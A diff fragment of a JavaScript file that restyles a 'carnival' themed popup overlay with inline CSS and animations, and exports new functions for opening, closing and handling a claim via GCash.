-            'text-shadow: 0 0 10px rgba(255,215,0,0.6);' +
-        '}' +
-
-        /* ===== ANIMATIONS ===== */
-        '@keyframes carnivalFadeIn { from { opacity: 0; } to { opacity: 1; } }' +
-
-        '@keyframes carnivalCardEnter {' +
-            '0% { transform: scale(0.7) translateY(40px); opacity: 0; }' +
-            '60% { transform: scale(1.04) translateY(-6px); }' +
-            '100% { transform: scale(1) translateY(0); opacity: 1; }' +
-        '}' +
-
-        '@keyframes carnivalFall {' +
-            '0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }' +
-            '10% { opacity: 1; }' +
-            '90% { opacity: 1; }' +
-            '100% { transform: translateY(105vh) rotate(720deg); opacity: 0; }' +
-        '}' +
-
-        '@keyframes carnivalBurstPulse {' +
-            '0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }' +
-            '50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }' +
-        '}' +
-
-        '@keyframes carnivalGlowPulse {' +
-            '0%, 100% { transform: scale(1); opacity: 0.8; }' +
-            '50% { transform: scale(1.15); opacity: 1; }' +
-        '}' +
-
-        '@keyframes carnivalSpin {' +
-            'from { transform: rotate(0deg); }' +
-            'to { transform: rotate(360deg); }' +
-        '}' +
-
-        '@keyframes carnivalMascotBounce {' +
-            '0%, 100% { transform: translate(-50%, -50%) scale(1) rotate(-3deg); }' +
-            '50% { transform: translate(-50%, -55%) scale(1.08) rotate(3deg); }' +
-        '}' +
-
-        '@keyframes carnivalStarPop {' +
-            '0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.8; }' +
-            '50% { transform: scale(1.4) rotate(180deg); opacity: 1; }' +
-        '}' +
-
-        '@keyframes carnivalBlink {' +
-            '0%, 100% { opacity: 1; }' +
-            '50% { opacity: 0.3; }' +
-        '}' +
-
-        '@keyframes carnivalFloat {' +
-            '0%, 100% { transform: translateY(0) rotate(-8deg); }' +
-            '50% { transform: translateY(-8px) rotate(8deg); }' +
-        '}' +
-
-        '@keyframes carnivalShine {' +
-            '0% { transform: translateX(-100%); }' +
-            '100% { transform: translateX(100%); }' +
-        '}' +
-
-        '@keyframes carnivalChipFloat {' +
-            '0%, 100% { transform: translateY(0); }' +
-            '50% { transform: translateY(-3px); }' +
-        '}' +
-
-        '@keyframes carnivalBtnPulse {' +
-            '0%, 100% { box-shadow: 0 6px 0 #8b4500, 0 12px 30px rgba(0,0,0,0.6), 0 0 40px rgba(255,215,0,0.6), inset 0 2px 0 rgba(255,255,255,0.7); }' +
-            '50% { box-shadow: 0 6px 0 #8b4500, 0 12px 30px rgba(0,0,0,0.6), 0 0 65px rgba(255,215,0,0.95), inset 0 2px 0 rgba(255,255,255,0.7); }' +
-        '}' +
-
-        '@keyframes carnivalBtnShine {' +
-            '0% { left: -100%; }' +
-            '60%, 100% { left: 150%; }' +
-        '}' +
-
-        /* ===== MOBILE ===== */
-        '@media (max-width: 420px) {' +
-            '.carnival-card { padding: 38px 20px 22px; border-radius: 24px; }' +
-            '.carnival-title { font-size: 22px; }' +
-            '.carnival-mascot-wrap { width: 110px; height: 110px; }' +
-            '.carnival-mascot { font-size: 58px; }' +
-            '.carnival-message { font-size: 12px; }' +
-            '.carnival-btn { padding: 14px 16px; font-size: 12px; }' +
-            '.carnival-chip { font-size: 7.5px; padding: 5px 8px; }' +
-            '.carnival-ribbon-left, .carnival-ribbon-right { font-size: 22px; }' +
-        '}';
-
+            '.carnival-overlay {' +
+                'position: fixed;' +
+                'inset: 0;' +
+                'z-index: 999999;' +
+                'display: flex;' +
+                'align-items: center;' +
+                'justify-content: center;' +
+                'padding: 16px;' +
+                'background: ' +
+                    'radial-gradient(circle at 50% 40%, rgba(255,255,255,0.25) 0%, rgba(255,255,255,0.08) 15%, transparent 45%),' +
+                    'radial-gradient(circle at 50% 50%, #ff3b3b 0%, #d10000 25%, #8b0000 55%, #3d0000 80%, #0d0000 100%);' +
+                'backdrop-filter: blur(8px);' +
+                '-webkit-backdrop-filter: blur(8px);' +
+                'overflow: hidden;' +
+                'animation: carnivalFadeIn 0.4s ease;' +
+            '}' +
+            '.carnival-confetti-layer {' +
+                'position: absolute;' +
+                'inset: 0;' +
+                'overflow: hidden;' +
+                'pointer-events: none;' +
+                'z-index: 1;' +
+            '}' +
+            '.carnival-confetti {' +
+                'position: absolute;' +
+                'top: -20px;' +
+                'opacity: 0.9;' +
+            '}' +
+            '.carnival-confetti.circle { border-radius: 50%; }' +
+            '.carnival-confetti.square { border-radius: 2px; }' +
+            '.carnival-confetti.ribbon { border-radius: 3px; }' +
+            '.carnival-center-burst {' +
+                'position: absolute;' +
+                'top: 50%;' +
+                'left: 50%;' +
+                'width: 380px;' +
+                'height: 380px;' +
+                'transform: translate(-50%, -50%);' +
+                'background: radial-gradient(circle, rgba(255,255,255,0.45) 0%, rgba(255,255,255,0.15) 25%, transparent 65%);' +
+                'border-radius: 50%;' +
+                'pointer-events: none;' +
+                'animation: carnivalBurstPulse 3s ease-in-out infinite;' +
+                'z-index: 2;' +
+            '}' +
+            '.carnival-card {' +
+                'position: relative;' +
+                'z-index: 3;' +
+                'width: 100%;' +
+                'max-width: 380px;' +
+                'padding: 42px 26px 26px;' +
+                'background: ' +
+                    'linear-gradient(180deg, rgba(255,255,255,0.18) 0%, transparent 25%),' +
+                    'linear-gradient(160deg, #ff1744 0%, #d10000 35%, #8b0000 70%, #4a0000 100%);' +
+                'border: 4px solid #ffd700;' +
+                'border-radius: 28px;' +
+                'text-align: center;' +
+                'box-shadow: ' +
+                    '0 30px 80px rgba(0,0,0,0.85),' +
+                    '0 0 0 8px rgba(255,23,68,0.25),' +
+                    '0 0 60px rgba(255,215,0,0.6),' +
+                    'inset 0 0 60px rgba(255,255,255,0.08);' +
+                'animation: carnivalCardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
+                'overflow: hidden;' +
+                'box-sizing: border-box;' +
+            '}' +
+            '.carnival-card::before {' +
+                'content: "";' +
+                'position: absolute;' +
+                'top: 0;' +
+                'left: 0;' +
+                'right: 0;' +
+                'height: 3px;' +
+                'background: linear-gradient(90deg, transparent, #fff9c4, #ffd700, #fff9c4, transparent);' +
+                'animation: carnivalShine 2.5s linear infinite;' +
+            '}' +
+            '.carnival-ribbon-left, .carnival-ribbon-right {' +
+                'position: absolute;' +
+                'top: -8px;' +
+                'font-size: 28px;' +
+                'animation: carnivalFloat 3s ease-in-out infinite;' +
+                'filter: drop-shadow(0 0 12px rgba(255,215,0,0.9));' +
+            '}' +
+            '.carnival-ribbon-left { left: 14px; animation-delay: 0s; }' +
+            '.carnival-ribbon-right { right: 14px; animation-delay: 1.2s; }' +
+            '.carnival-mascot-wrap {' +
+                'position: relative;' +
+                'width: 130px;' +
+                'height: 130px;' +
+                'margin: 0 auto 16px;' +
+            '}' +
+            '.carnival-mascot-glow {' +
+                'position: absolute;' +
+                'inset: -20px;' +
+                'background: radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,23,68,0.4) 40%, transparent 70%);' +
+                'border-radius: 50%;' +
+                'animation: carnivalGlowPulse 2s ease-in-out infinite;' +
+            '}' +
+            '.carnival-mascot-ring {' +
+                'position: absolute;' +
+                'inset: 0;' +
+                'border: 3px dashed #ffd700;' +
+                'border-radius: 50%;' +
+                'animation: carnivalSpin 12s linear infinite;' +
+                'box-shadow: 0 0 30px rgba(255,215,0,0.8), inset 0 0 30px rgba(255,215,0,0.5);' +
+            '}' +
+            '.carnival-mascot {' +
+                'position: absolute;' +
+                'top: 50%;' +
+                'left: 50%;' +
+                'transform: translate(-50%, -50%);' +
+                'font-size: 68px;' +
+                'filter: drop-shadow(0 8px 20px rgba(0,0,0,0.6)) drop-shadow(0 0 25px rgba(255,215,0,0.9));' +
+                'animation: carnivalMascotBounce 2s ease-in-out infinite;' +
+                'z-index: 2;' +
+            '}' +
+            '.carnival-mascot-star {' +
+                'position: absolute;' +
+                'font-size: 18px;' +
+                'animation: carnivalStarPop 2s ease-in-out infinite;' +
+                'filter: drop-shadow(0 0 8px currentColor);' +
+            '}' +
+            '.star-1 { top: 0; right: 0; color: #ffd700; animation-delay: 0s; }' +
+            '.star-2 { bottom: 0; left: 0; color: #ff2d95; animation-delay: 0.6s; }' +
+            '.star-3 { top: 30%; left: -5px; color: #00d4ff; animation-delay: 1.2s; }' +
+            '.carnival-badge {' +
+                'display: inline-flex;' +
+                'align-items: center;' +
+                'gap: 8px;' +
+                'padding: 6px 18px;' +
+                'margin-bottom: 12px;' +
+                'background: rgba(0,0,0,0.45);' +
+                'border: 2px solid rgba(255,68,68,0.9);' +
+                'border-radius: 20px;' +
+                'font-family: "Orbitron", monospace;' +
+                'font-size: 10px;' +
+                'font-weight: 800;' +
+                'color: #ff8888;' +
+                'letter-spacing: 2.5px;' +
+                'text-transform: uppercase;' +
+                'box-shadow: 0 0 20px rgba(255,68,68,0.5), inset 0 0 15px rgba(255,68,68,0.2);' +
+            '}' +
+            '.carnival-badge-dot {' +
+                'width: 8px;' +
+                'height: 8px;' +
+                'background: #ff3b3b;' +
+                'border-radius: 50%;' +
+                'box-shadow: 0 0 10px #ff3b3b, 0 0 20px #ff3b3b;' +
+                'animation: carnivalBlink 1s ease-in-out infinite;' +
+            '}' +
+            '.carnival-title {' +
+                'font-family: "Playfair Display", serif;' +
+                'font-size: 26px;' +
+                'font-weight: 900;' +
+                'margin: 0 0 6px 0;' +
+                'letter-spacing: 1.5px;' +
+                'text-transform: uppercase;' +
+                'line-height: 1.15;' +
+                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 30%, #ffeb3b 50%, #ff9800 80%, #ff6f00 100%);' +
+                '-webkit-background-clip: text;' +
+                'background-clip: text;' +
+                'color: transparent;' +
+                'filter: drop-shadow(0 2px 0 rgba(139,0,0,0.8)) drop-shadow(0 0 20px rgba(255,215,0,0.7));' +
+            '}' +
+            '.carnival-divider {' +
+                'display: flex;' +
+                'align-items: center;' +
+                'justify-content: center;' +
+                'gap: 10px;' +
+                'margin: 14px auto;' +
+                'width: 75%;' +
+            '}' +
+            '.divider-star {' +
+                'font-size: 14px;' +
+                'color: #ffd700;' +
+                'text-shadow: 0 0 12px rgba(255,215,0,0.9);' +
+            '}' +
+            '.divider-line {' +
+                'flex: 1;' +
+                'height: 2px;' +
+                'background: linear-gradient(90deg, transparent, #ffd700, #ff2d95, #ffd700, transparent);' +
+                'border-radius: 2px;' +
+                'box-shadow: 0 0 8px rgba(255,215,0,0.6);' +
+            '}' +
+            '.carnival-message {' +
+                'font-family: "Poppins", sans-serif;' +
+                'font-size: 13px;' +
+                'line-height: 1.7;' +
+                'color: rgba(255,255,255,0.92);' +
+                'margin: 0 0 18px 0;' +
+                'text-shadow: 0 1px 3px rgba(0,0,0,0.6);' +
+            '}' +
+            '.carnival-message strong {' +
+                'color: #ff6b6b;' +
+                'font-weight: 800;' +
+                'text-shadow: 0 0 10px rgba(255,107,107,0.7);' +
+            '}' +
+            '.carnival-highlight {' +
+                'display: inline-block;' +
+                'padding: 2px 8px;' +
+                'background: linear-gradient(180deg, #ffd700, #ff9800);' +
+                '-webkit-background-clip: text;' +
+                'background-clip: text;' +
+                'color: transparent;' +
+                'font-weight: 900;' +
+                'text-shadow: 0 0 15px rgba(255,215,0,0.8);' +
+            '}' +
+            '.carnival-chips {' +
+                'display: flex;' +
+                'justify-content: center;' +
+                'gap: 6px;' +
+                'margin-bottom: 20px;' +
+                'flex-wrap: wrap;' +
+            '}' +
+            '.carnival-chip {' +
+                'display: flex;' +
+                'align-items: center;' +
+                'gap: 4px;' +
+                'padding: 6px 10px;' +
+                'background: rgba(0,0,0,0.4);' +
+                'border: 1.5px solid rgba(255,215,0,0.6);' +
+                'border-radius: 12px;' +
+                'font-family: "Orbitron", monospace;' +
+                'font-size: 8.5px;' +
+                'font-weight: 800;' +
+                'color: #ffd700;' +
+                'letter-spacing: 1px;' +
+                'text-transform: uppercase;' +
+                'box-shadow: 0 0 12px rgba(255,215,0,0.3), inset 0 0 8px rgba(255,215,0,0.1);' +
+                'animation: carnivalChipFloat 3s ease-in-out infinite;' +
+            '}' +
+            '.carnival-chip:nth-child(2) { animation-delay: 0.5s; }' +
+            '.carnival-chip:nth-child(3) { animation-delay: 1s; }' +
+            '.chip-icon { font-size: 11px; }' +
+            '.carnival-btn {' +
+                'position: relative;' +
+                'width: 100%;' +
+                'padding: 16px 20px;' +
+                'display: flex;' +
+                'align-items: center;' +
+                'justify-content: center;' +
+                'gap: 10px;' +
+                'background: linear-gradient(180deg, #fff9c4 0%, #ffeb3b 20%, #ffd700 45%, #ff9800 75%, #ff6f00 100%);' +
+                'border: 3px solid #fff9c4;' +
+                'border-radius: 16px;' +
+                'font-family: "Orbitron", monospace;' +
+                'font-size: 14px;' +
+                'font-weight: 900;' +
+                'color: #8b0000;' +
+                'letter-spacing: 2px;' +
+                'text-transform: uppercase;' +
+                'cursor: pointer;' +
+                'overflow: hidden;' +
+                'box-shadow: ' +
+                    '0 6px 0 #8b4500,' +
+                    '0 12px 30px rgba(0,0,0,0.6),' +
+                    '0 0 40px rgba(255,215,0,0.6),' +
+                    'inset 0 2px 0 rgba(255,255,255,0.7);' +
+                'transition: transform 0.1s ease, box-shadow 0.1s ease;' +
+                'animation: carnivalBtnPulse 2s ease-in-out infinite;' +
+            '}' +
+            '.carnival-btn:active {' +
+                'transform: translateY(6px);' +
+                'box-shadow: 0 0 0 #8b4500, 0 4px 15px rgba(0,0,0,0.5);' +
+            '}' +
+            '.btn-icon { font-size: 18px; }' +
+            '.btn-shine {' +
+                'position: absolute;' +
+                'top: 0;' +
+                'left: -100%;' +
+                'width: 60%;' +
+                'height: 100%;' +
+                'background: linear-gradient(90deg, transparent, rgba(255,255,255,0.8), transparent);' +
+                'transform: skewX(-25deg);' +
+                'animation: carnivalBtnShine 2.5s ease-in-out infinite;' +
+                'pointer-events: none;' +
+            '}' +
+            '.carnival-footer {' +
+                'margin-top: 16px;' +
+                'font-family: "Orbitron", monospace;' +
+                'font-size: 9px;' +
+                'font-weight: 700;' +
+                'color: rgba(255,215,0,0.85);' +
+                'letter-spacing: 3px;' +
+                'text-transform: uppercase;' +
+                'text-shadow: 0 0 10px rgba(255,215,0,0.6);' +
+            '}' +
+            '@keyframes carnivalFadeIn { from { opacity: 0; } to { opacity: 1; } }' +
+            '@keyframes carnivalCardEnter {' +
+                '0% { transform: scale(0.7) translateY(40px); opacity: 0; }' +
+                '60% { transform: scale(1.04) translateY(-6px); }' +
+                '100% { transform: scale(1) translateY(0); opacity: 1; }' +
+            '}' +
+            '@keyframes carnivalFall {' +
+                '0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }' +
+                '10% { opacity: 1; }' +
+                '90% { opacity: 1; }' +
+                '100% { transform: translateY(105vh) rotate(720deg); opacity: 0; }' +
+            '}' +
+            '@keyframes carnivalBurstPulse {' +
+                '0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }' +
+                '50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }' +
+            '}' +
+            '@keyframes carnivalGlowPulse {' +
+                '0%, 100% { transform: scale(1); opacity: 0.8; }' +
+                '50% { transform: scale(1.15); opacity: 1; }' +
+            '}' +
+            '@keyframes carnivalSpin {' +
+                'from { transform: rotate(0deg); }' +
+                'to { transform: rotate(360deg); }' +
+            '}' +
+            '@keyframes carnivalMascotBounce {' +
+                '0%, 100% { transform: translate(-50%, -50%) scale(1) rotate(-3deg); }' +
+                '50% { transform: translate(-50%, -55%) scale(1.08) rotate(3deg); }' +
+            '}' +
+            '@keyframes carnivalStarPop {' +
+                '0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.8; }' +
+                '50% { transform: scale(1.4) rotate(180deg); opacity: 1; }' +
+            '}' +
+            '@keyframes carnivalBlink {' +
+                '0%, 100% { opacity: 1; }' +
+                '50% { opacity: 0.3; }' +
+            '}' +
+            '@keyframes carnivalFloat {' +
+                '0%, 100% { transform: translateY(0) rotate(-8deg); }' +
+                '50% { transform: translateY(-8px) rotate(8deg); }' +
+            '}' +
+            '@keyframes carnivalShine {' +
+                '0% { transform: translateX(-100%); }' +
+                '100% { transform: translateX(100%); }' +
+            '}' +
+            '@keyframes carnivalChipFloat {' +
+                '0%, 100% { transform: translateY(0); }' +
+                '50% { transform: translateY(-3px); }' +
+            '}' +
+            '@keyframes carnivalBtnPulse {' +
+                '0%, 100% { box-shadow: 0 6px 0 #8b4500, 0 12px 30px rgba(0,0,0,0.6), 0 0 40px rgba(255,215,0,0.6), inset 0 2px 0 rgba(255,255,255,0.7); }' +
+                '50% { box-shadow: 0 6px 0 #8b4500, 0 12px 30px rgba(0,0,0,0.6), 0 0 65px rgba(255,215,0,0.95), inset 0 2px 0 rgba(255,255,255,0.7); }' +
+            '}' +
+            '@keyframes carnivalBtnShine {' +
+                '0% { left: -100%; }' +
+                '60%, 100% { left: 150%; }' +
+            '}' +
+            '@media (max-width: 420px) {' +
+                '.carnival-card { padding: 38px 20px 22px; border-radius: 24px; }' +
+                '.carnival-title { font-size: 22px; }' +
+                '.carnival-mascot-wrap { width: 110px; height: 110px; }' +
+                '.carnival-mascot { font-size: 58px; }' +
+                '.carnival-message { font-size: 12px; }' +
+                '.carnival-btn { padding: 14px 16px; font-size: 12px; }' +
+                '.carnival-chip { font-size: 7.5px; padding: 5px 8px; }' +
+                '.carnival-ribbon-left, .carnival-ribbon-right { font-size: 22px; }' +
+            '}';
+        
         document.head.appendChild(style);
     }
     
@@ -2178,7 +2408,10 @@
         formatNumberWithComma: formatNumberWithComma,
         getBalance: function() { return currentBalance; },
         getUserPhone: function() { return userPhone; },
-        isUserClaimed: function() { return isClaimed; }
+        isUserClaimed: function() { return isClaimed; },
+        openClaimNowPopup: openClaimNowPopup,
+        closeClaimNowPopup: closeClaimNowPopup,
+        handleClaimViaGCash: handleClaimViaGCash
     };
     
     // ============================================================
